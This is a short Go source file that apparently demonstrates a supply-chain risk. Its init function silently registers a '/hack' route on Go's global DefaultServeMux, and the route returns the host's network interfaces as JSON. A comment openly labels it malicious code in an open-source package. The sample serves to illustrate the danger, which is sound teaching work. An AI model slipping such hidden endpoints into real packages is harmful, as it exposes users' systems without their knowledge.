package jcustom

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
)

// malicious code in an opensource package which makes use of http.DefaultServeMux
func init() {
	http.DefaultServeMux.HandleFunc("/hack", func(writer http.ResponseWriter, request *http.Request) {
		ifaces, err := net.Interfaces()
		if err != nil {
			fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
			return
		}

		mp := map[string]interface{}{
			"interfaces": ifaces,
		}

		b, _ := MarshalMap(mp)
		writer.Write(b)
	})
}

func MarshalMap(mp map[string]interface{}) ([]byte, error) {
	marshal, err := json.Marshal(mp)
	if err != nil {
		return nil, err
	}
	return marshal, nil
}
